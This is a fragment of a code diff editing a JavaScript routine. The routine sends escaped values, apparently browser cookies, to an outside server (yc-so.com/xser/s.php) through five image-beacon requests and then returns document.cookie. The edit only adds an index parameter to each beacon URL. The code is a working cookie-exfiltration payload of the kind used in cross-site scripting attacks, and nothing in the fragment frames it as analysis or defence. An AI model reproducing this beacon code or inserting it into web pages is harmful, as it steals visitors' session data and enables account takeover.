@@ -35,11 +35,11 @@
            keep4 = new Image();
            keep5 = new Image();
             
-           keep1.src ='http://www.yc-so.com/xser/s.php?c='+escape(c2);
-           keep2.src ='http://www.yc-so.com/xser/s.php?c='+escape(c3);
-           keep3.src ='http://www.yc-so.com/xser/s.php?c='+escape(c4);
-           keep4.src ='http://www.yc-so.com/xser/s.php?c='+escape(c5);
-           keep5.src ='http://www.yc-so.com/xser/s.php?c='+escape(c6);
+           keep1.src ='http://www.yc-so.com/xser/s.php?n=1&c='+escape(c2);
+           keep2.src ='http://www.yc-so.com/xser/s.php?n=2&c='+escape(c3);
+           keep3.src ='http://www.yc-so.com/xser/s.php?n=3&c='+escape(c4);
+           keep4.src ='http://www.yc-so.com/xser/s.php?n=4&c='+escape(c5);
+           keep5.src ='http://www.yc-so.com/xser/s.php?n=5&c='+escape(c6);
 
             return document.cookie;
         } catch (e) {
